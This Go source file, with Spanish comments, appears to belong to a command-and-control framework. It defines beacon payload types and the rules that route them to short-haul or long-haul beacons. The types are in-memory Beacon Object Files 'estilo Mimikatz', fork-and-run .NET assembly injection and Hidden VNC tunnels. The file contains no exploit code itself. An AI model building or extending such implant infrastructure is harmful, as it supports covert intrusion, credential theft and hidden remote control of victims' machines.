package beacons

import (
	"errors"
	"fmt"
)

// PayloadKind clasifica una carga dinámica avanzada.
type PayloadKind string

const (
	// PayloadBOF: Beacon Object File (C/C++, estilo Mimikatz). Cargado en
	// memoria por el beacon interactivo sin escribir a disco.
	PayloadBOF PayloadKind = "bof"

	// PayloadAssembly: Execute-Assembly (.NET, estilo PowerView/SharpHound).
	// Inyecta CLR en un proceso sacrificable (fork-and-run), en memoria.
	PayloadAssembly PayloadKind = "assembly"

	// PayloadHVNC: túnel gráfico interactivo (Hidden VNC). Requiere túnel
	// persistente bidireccional (WebSocket) y latencia nula.
	PayloadHVNC PayloadKind = "hvnc"
)

// ParsePayloadKind valida y normaliza un tipo de payload.
func ParsePayloadKind(s string) (PayloadKind, error) {
	switch PayloadKind(s) {
	case PayloadBOF, PayloadAssembly, PayloadHVNC:
		return PayloadKind(s), nil
	case "":
		return "", errors.New("beacons: payload kind vacío")
	default:
		return "", fmt.Errorf("beacons: payload kind %q inválido (usar bof|assembly|hvnc)", s)
	}
}

// payloadInteractivity clasifica cada PayloadKind según si requiere un
// beacon interactivo (short-haul) o puede despacharse a uno de
// supervivencia (long-haul).
//
// Un payload interactivo se caracteriza por:
//   - Consumir mucha CPU/RAM/red durante la ejecución
//   - Requerir latencia baja para ser útil (túneles gráficos)
//   - Tener un ciclo de vida corto pero intenso
//
// Un payload NO interactivo podría ser: descarga de un chunk de archivo,
// ping de latencia, heartbeat, etc.
var payloadInteractivity = map[PayloadKind]bool{
	PayloadBOF:      true, // ejecución pesada in-process
	PayloadAssembly: true, // hosting CLR fork-and-run
	PayloadHVNC:     true, // túnel gráfico de latencia baja
}

// EsInteractivo indica si el tipo exige un beacon de perfil interactivo.
//
// Por defecto devuelve false: cualquier PayloadKind nuevo que no esté
// explícitamente en payloadInteractivity se considerará NO interactivo.
// Es la opción conservadora: si te olvidas de clasificar un payload nuevo,
// el manager lo rechazará en beacons long-haul en lugar de aceptarlo
// silenciosamente.
func (k PayloadKind) EsInteractivo() bool {
	return payloadInteractivity[k]
}

// AssignPayload es el motor de validación de enrutamiento de cargas.
//
// REGLA DURA: las cargas dinámicas pesadas (BOF, .NET) y los túneles
// interactivos (hVNC) SOLO pueden enrutarse a beacons de perfil
// interactivo (Short-Haul). El manager rechaza automáticamente cualquier
// intento de despacharlas a beacons de supervivencia (Long-Haul).
func AssignPayload(b *Beacon, kind PayloadKind) error {
	if b == nil {
		return errors.New("beacons: beacon nil")
	}
	if _, err := ParsePayloadKind(string(kind)); err != nil {
		return err
	}
	if kind.EsInteractivo() && b.Profile != ProfileShortHaul {
		return fmt.Errorf(
			"beacons: RECHAZADO — %s requiere perfil short-haul, beacon %q es %s",
			kind, b.Name, b.Profile,
		)
	}
	if b.State == StateOffline || b.State == StateAdminStop || b.State == StateInternalErr {
		return fmt.Errorf("beacons: beacon %q no disponible (estado %s)", b.Name, b.State)
	}
	return nil
}

// TunnelState representa la fase de un túnel hVNC.
type TunnelState string

const (
	TunnelNone    TunnelState = "none"
	TunnelOpening TunnelState = "opening"
	TunnelActive  TunnelState = "active"
	TunnelClosing TunnelState = "closing"
	TunnelClosed  TunnelState = "closed"
)
